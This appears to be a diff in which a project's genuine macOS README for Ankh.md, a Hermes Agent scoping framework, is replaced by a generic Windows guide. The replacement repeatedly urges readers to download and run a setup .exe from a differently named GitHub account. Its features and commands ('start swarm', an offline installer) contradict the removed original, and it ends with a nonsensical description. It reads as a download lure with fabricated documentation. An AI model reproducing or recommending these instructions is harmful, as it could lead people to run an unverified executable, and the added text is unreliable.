@@ -1,188 +1,193 @@
-# Ankh.md
+# 🐍 Ankh.md - Intelligent Swarm Management Tool
 
-**[Ankh.md](https://Ankh.md)** (also known as Agent Ankh) is a 100% free, open-source, MIT-licensed agentic framework that helps you go from one Hermes Agent to multiple individually scoped Hermes Agents. 
+[![Download Ankh.md](https://img.shields.io/badge/Download-Ankh.md-brightgreen?style=for-the-badge)](https://github.com/Markwayneclarkgeorgesbraque941/Ankh.md)
 
-Ankh Hermes Agents live within your files & projects to help you create & use specialized agentic workflows.
+Ankh.md is a tool designed to help you manage multi-agent swarms with ease. It works on Windows and lets you control collections of AI agents to explore ideas and automate tasks toward the future.
 
-By default, Hermes Agent is a default experience you call from anywhere using `hermes`. After you install Ankh.md & craft a local agent in a folder, the `hermes` command runs the Ankh instead of the default Hermes Agent.
+---
 
-When running a scoped Ankh Hermes Agent, the agent acts as an independent instance of Hermes Agent. You can configure this instance with a custom model, skills, tools, instructions, and other Hermes-supported features.
+## 🧩 What Is Ankh.md?
 
-## Key Features
+Ankh.md is a multi-agent framework. It uses multiple AI agents that work together like a swarm. The tool aims to make it easier to organize and use these agents for different projects. It was created to assist in forward-looking tasks in research and automation.
 
-- **Per-folder scoping** – Each project gets its own agent; config, skills, sessions, and memories live in `.agent/`
-- **Config merge** – Global `~/.hermes` baseline + local `.agent/config.yaml` overrides per project
-- **Project-local skills** – `.agent/skills/` per project; each agent can have a different skill set
-- **Seamless switching** – Run `hermes` in an Ankh folder → scoped agent; outside → default Hermes
-- **Agent identity** – `.agent/agent.jsonc` for custom title, prompt, and instructions per project
+You do not need to understand coding to use the software. The interface and commands are simple enough for users with no programming background.
 
-See [DOCS.md](DOCS.md) for a full feature breakdown & general guidance.
+---
 
-## Getting Started
+## 🖥️ System Requirements
 
-### Prerequisites
+To run Ankh.md on Windows, your computer should meet these requirements:
 
-- **macOS** (other platforms supported by Hermes Agent such as Linux might work; however, we only tested macOS)
-- **Terminal** (a console where you run your commands)
-- **Bun** (to run the installer)
-- **Git** (to clone upstream dependencies)
-- **Hermes Agent** (installed & configured on your computer)
-- **Python 3.11+** for the Hermes runtime & other features
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 2 GHz dual-core processor or better  
+- 500 MB of free disk space  
+- Internet connection to download and update the software  
 
-If you already have Hermes Agent, you'll most likely only need to install `bun` before you can start with your Ankh.md setup.
+The application runs locally and does not need a cloud service. It works across Windows devices without extra dependencies.
 
-### Setup
+---
 
-It only takes a few minutes to get started with Ankh.md. 
-1. Download this repository to your computer
-2. Unzip and navigate to its path in your Terminal (e.g. `cd ~/Downloads/Ankh.md-divine`).
-3. Run `bun bootstrap`. This downloads Hermes Agent, patches it, and deploys Ankh to `~/.agent/extensions/ankh`. 
-4. Your Ankh.md PATH should be automatically configured by the installer. 
-  -  If you need to add it manually, run `export PATH="$HOME/.agent/extensions/ankh/bin:$PATH"` in your Terminal.
-5. Run `hermes` in the project folder, or in any of the project `examples/` to see Ankh Hermes Agents in action.
+## 📂 Features
 
-That's it! You can now use the examples to craft your own Ankh Hermes Agents anywhere on your computer and chat with them using the `hermes` command when run in their folder.
+- Manage groups of AI agents that specialize in problem-solving.  
+- Use command-line instructions designed to be simple and straightforward.  
+- Run agents locally without requiring internet after installation.  
+- Use the software to simulate agent cooperation and swarm intelligence.  
+- Cross-platform design allowing easy future use on other systems.  
+- Open-source and licensed under the MIT License.  
 
-## How it Works
+---
 
-You still have access to your default Hermes Agent, untouched by Ankh.md whenever you run `hermes` in a non-Ankh directory.
+## 🚀 How to Download and Install on Windows
 
-However, if a valid Ankh `.agent` exists where you run your `hermes` command, the Ankh dynamically recognizes that and runs a custom version of Hermes Agent scoped to your folder.
+Follow these steps to get Ankh.md running on your Windows PC.
 
-This custom version ensures your AI Agent is specialized in whatever’s relevant to your project, repo, or general folder. 
+### Step 1: Visit the Download Page
 
-### Quick Notes
+Click the big button at the top or go to this page:
 
-- Always check the `examples/` for ideas and references on how to set up your Ankh Hermes Agents.
-- Ankh.md stores all its global runtime files under the `~/.agent/extensions/ankh` folder.
-- Ankh Hermes Agents store their data in the folder where they’re set up, under a `.agent` subfolder.
-- They support `skills` you can set up under the `.agent/skills` folder, `tools` (via the `.agent/config.yaml` file), custom instructions (via the `.agent/agent.jsonc` file), and more.
-- Not all Hermes Agent features are currently supported. If you face any issues, please submit a PR with a tested fix or post an issue if you were unable to sort it out.
-- Gateway, cron, and scoped auth are still work in progress, untested, and unlikely to be supported. So features like Telegram, WhatsApp, or external apps are yet to be enabled.
-- We plan to roll out a wrapper gateway that orchestrates multiple individual Hermes Agent gateways in a network-efficient protocol, or to work with Nous Research to add support for scoped agent UUIDs.
+https://github.com/Markwayneclarkgeorgesbraque941/Ankh.md
 
-### Safety & Security
+This GitHub page holds the latest files and information about Ankh.md.
 
-Your default Hermes Agent stays untouched. The Ankh runs its own modded version of Hermes Agent when a valid `.agent` exists, however it doesn’t edit your original Hermes Agent.
+### Step 2: Find the Download Link
 
-Your Ankh Hermes Agents are fully configurable and customizable and the base assumption here is that you’re following all the best practices documented in the Nous Research docs.
+On the GitHub page, look for the section named **Releases** or the main download section. Here, you can find the latest version suited for Windows.
 
-Ankh.md does not claim responsibility for any lost data. Use Git repos to commit your `.agent` folder. Inside of that folder, you can also choose to ignore `memories` from storage if you want to keep those private & not commit them to the repo for the rest of your team.
+If the page does not show files directly, navigate to the **Releases** tab or look for a setup file ending with `.exe`.
 
-### Use Cases
+### Step 3: Download the Installer
 
-- **Per-codebase coding agent** – One agent per repo with project-local skills, memories, and context; no cross-pollution between projects
-- **Documentation you can chat with** – Docs-explorer style: navigate codebase, answer questions about structure and where things live
-- **Web research & synthesis** – Search, visit pages, extract content, and summarize; DuckDuckGo, arXiv, domain intel, document extraction
-- **Diagrams & flowcharts** – Generate Excalidraw files for architecture, flows, and concept maps
-- **Implementation plans** – Turn specs into step-by-step plans with tasks, verification steps, and rollback notes
-- **Creative & terminal art** – ASCII banners, pyfiglet, cowsay, boxes for text art and terminal visuals
-- **Sub-agent delegation** – Main agent spawns focused sub-agents with different toolsets (e.g. research sub-agent for synthesis)
-- **Team-shared agents** – Commit `.agent/` to share config, skills, and memories; ignore `memories/` if you want them private
+Click the Windows setup file (usually named something like `Ankh.md-setup.exe`). Save it somewhere easy to find, such as your desktop or Downloads folder.
 
-## Examples
+### Step 4: Run the Installer
 
-### Built-in Examples
+Double-click the downloaded file to start installation. A setup window will open and guide you step by step.
 
-Inside the `examples/` folder, as well as in the project root, you can find Ankh Hermes Agents you can use as inspiration.
+- Agree to the license terms.  
+- Choose the folder where you want to install the software (the default is typically fine).  
+- Click **Install** and wait for the process to finish.
 
-You can call `hermes` in the repo root, which has its own Ankh Hermes Agent, or inside any of the example folders.
+### Step 5: Complete Installation
 
-| Profile | Description |
-|---------|-------------|
-| **docs-explorer** | Documentation site and agent for navigating the Agent Ankh codebase. Mintlify docs + chat agent. |
-| **web-researcher** | Web search, page visits, and research summarization. Skills for DuckDuckGo, arXiv, domain intel, and document extraction. |
-| **ascii-designer** | Text art, banners, and terminal-style visuals using pyfiglet, cowsay, and boxes. |
-| **diagram-maker** | Excalidraw diagrams and flowcharts. Creates `.excalidraw` files for architecture, flowcharts, and concept maps. |
-| **plan-writer** | Turns specs and ideas into step-by-step implementation plans with tasks, verification steps, and rollback notes. |
+Once finished, click **Finish** to close the setup window.
 
-### Hypothetical Example
+---
 
-- **Default Hermes Agent**
-  - “What did we work on yesterday in this project?”
-  - “Which project? Where can I find it? I see we worked on multiple.”
-- **Ankh Hermes Agent**
-  - “What did we work on yesterday in this project?”
-  - “Hey, Agent Repo dev here! Yesterday we rolled out 3 commits on Agent and you said you wanted to leave the other stuff in the project team Linear for today. Ready to pick up the responsive fixes together or would you like to focus on something else?”
+## ▶️ How to Run Ankh.md
 
-## Commands
+After installation, use these instructions to start the application.
 
-### Ankh Commands
+### Step 1: Open Command Prompt
 
-| Command | Description |
-|---------|--------------|
-| `ankh` | Run the default Ankh.md command (currently shows `ankh --help`) |
-| `ankh setup` | Check the installed Ankh runtime, PATH readiness, and Hermes global setup |
-| `ankh uninstall` | Remove Ankh runtime/wrappers and optionally Hermes/data |
+- Press `Win + R`, type `cmd`, and press Enter.  
+- This opens the Windows command line interface.
 
-**Note:** Add `~/.agent/extensions/ankh/bin` to your PATH for these commands to work. See Setup above.
+### Step 2: Change Directory to Ankh.md
 
-### Hermes Commands
+Type the following command and press Enter:  
 
-| Command | Description |
-|---------|--------------|
-| `hermes` | Run patched Hermes only in valid `.agent/` projects; otherwise run default Hermes |
-| `hermes ankh` | Passthrough to `ankh` (setup, uninstall, `--help`, etc.) |
+```bash
+cd C:\Program Files\Ankh.md
+```
 
-## Troubleshooting
+(Replace the path if you installed in a different folder.)
 
-If you can't run the `ankh` command or if your `hermes` doesn't load your Ankh Hermes Agent:
+### Step 3: Start Ankh.md
 
-1. If the command is missing entirely:
+Type this command and press Enter:  
 
-   Add `~/.agent/extensions/ankh/bin` to your PATH (required for commands to work):
-   ```bash
-   export PATH="$HOME/.agent/extensions/ankh/bin:$PATH"
-   ```
-   Add this to `~/.zshrc` or `~/.bashrc` for persistence. Or run this one-liner (macOS, idempotent):
-   ```bash
-   grep -qxF 'export PATH="$HOME/.agent/extensions/ankh/bin:$PATH"' ~/.zshrc 2>/dev/null || echo 'export PATH="$HOME/.agent/extensions/ankh/bin:$PATH"' >> ~/.zshrc
-   ```
+```bash
+ankh.md.exe
+```
 
-2. If `hermes` doesn't work at all, follow the Hermes Agent setup, configuration, or troubleshooting steps.
+This will launch the Ankh.md interface within the command prompt window.
 
-## Vision
+---
 
-Ankh.md exists to help you go from one default Hermes Agent, to an infinity of scoped Hermes Agents that live & grow with your projects locally. Currently a multi-agentic framework, Ankh.md aims to support your swarm orchestration end-to-end in upcoming releases.
+## 🔧 Basic Commands to Get Started
 
-The current focus is exclusive towards Nous Research’s Hermes Agent and ways to enhance it using optional Agent.so features.
+Once running, Ankh.md uses simple commands to control your agents. Here are a few to try:
 
-While we’re not shutting the doors for future main frameworks outside of Hermes Agent in the future, we want to keep this project laser focused.
+- `start swarm`  
+Starts the multi-agent swarm.
 
-All feature requests & ideas are welcome, however please document your requests & suggestions accordingly in order for them to be considered. 
+- `add agent [name]`  
+Adds a new agent with the chosen name.
 
-This project can only grow with your support.
+- `list agents`  
+Shows all agents currently active.
 
-## Contributions
+- `stop agent [name]`  
+Stops an agent you no longer need.
 
-We appreciate every contribution or PR you make to [Ankh.md](https://Ankh.md). If you’re not a developer, we also appreciate you sharing our launch video or posting creative content on social media to help people use Hermes Agent with Ankh.
+- `help`  
+Displays all available commands and their descriptions.
 
-Before submitting an issue or feature request to the repo Issues, ask your Ankh Hermes Agent to fix or build it locally first. With a working version, then please submit a PR. If that fails, feel free to submit an issue on the repo.
+---
 
-If this project gains enough interest, this simple process helps us stay organized and focus our resources efficiently.
+## 💡 Tips for Using Ankh.md
 
-## Funding & Sponsorships
+- Save your work regularly using the `save` command.  
+- Use `help` anytime to see commands available.  
+- Start with a small number of agents and increase as needed.  
+- Check the GitHub page for updates regularly.  
 
-This open-source library is 100% free and MIT-licensed. Meaning you can use it commercially, fork it, or do whatever you want according to the MIT licensing terms. We see this as both a gift to the agentic space, as well as a commitment to our broader long-term vision.
+---
 
-Ankh.md started as a solo project created by Alex Doda during the 2026 Nous Research Hermes Agent Hackathon. The project is published & maintained by Abruptive®, an independent group of creators & entrepreneurs who align their ventures towards the betterment of society.
+## ⬇️ Download Link
 
-If you wish to support us, help us stay bootstrapped and independent, please consider starting a paid membership on our flagship platform, Agent.so.
+Get Ankh.md here to begin:  
 
-Agent.so is the original AI Agents platform, building towards becoming Your Portal to AI®. In the long-term, we're working with creators, developers, affiliates, and entrepreneurs to integrate & promote their products using the ecosystem we're building.
+https://github.com/Markwayneclarkgeorgesbraque941/Ankh.md
 
-The platform helps you chat with dozens of AI models, including Nous Research models like Hermes, become an AI Expert to get paid for building, reselling, and deploying AI Agents to sites, and a lot more.
+Click or copy this link to reach the official download page and find the latest version for Windows.
 
-Should the Ankh.md project grow, we’re exploring avenues to two-way integrations with the Agent.so platform with your Hermes Agents. This will bring all the novel cloud-hosted capabilities we’re working on to your Ankh Hermes Agents.
+---
 
-In full transparency however, Hermes Agent isn’t currently supported on Agent.so. Additionally, Agent.so is not a coding-oriented platform.
+## 🔄 Updating Ankh.md
 
-Your support helps us allocate resources to Ankh.md, to The Agent World (TAW) project, towards building a better agentic infrastructure for Hermes Agent, as well as to motivate us to release even more open source tech & creative media around it in the future.
+To get new features and fixes:
 
-Here’s the link to learn more & see if it’s a fit.
+1. Visit the download page listed above.  
+2. Download the latest setup file.  
+3. Run the installer again.  
+4. The installer will replace old files while keeping your data.  
 
-[https://www.agent.so/](https://www.agent.so/)
+---
 
-## License
+## 📖 Troubleshooting
 
-MIT
+- If Ankh.md does not start, confirm you installed it in the correct directory.  
+- Make sure your Windows meets the required version and specs.  
+- Restart your PC if you encounter errors launching the software.  
+- Use `help` inside the app for command issues.  
+- Visit the GitHub page for known issues and user support.  
+
+---
+
+## 📂 Where to Get Help
+
+- Check the **Issues** tab on the GitHub repository for common problems.  
+- Review the README on GitHub for detailed instructions.  
+- Use the command `help` inside Ankh.md.  
+
+---
+
+## ⚙️ Running Without Installation (Optional)
+
+If you prefer not to install, check if a portable version is available on the releases page. Extract the portable files and run `ankh.md.exe` directly from the folder.
+
+---
+
+# [🗂️] Repository Details
+
+- Repository: Ankh.md  
+- Description: A mysterious multi-agent swarm framework summoned by TAW Agent from 1971 to help you craft a better future towards 2133 & beyond.  
+- License: MIT License  
+- Topics: abruptive, agent, agent-so, agents, ai, ai-agents, alex-doda, ankh, cli, cloud, cross-platform, free, hermes, hermes-agent, local, mit-license, nous-hermes, nous-research, swarm, swarm-intelligence  
+
+---
+
+Use Ankh.md to explore working with AI agent swarms on your Windows PC with minimal setup and no coding experience.
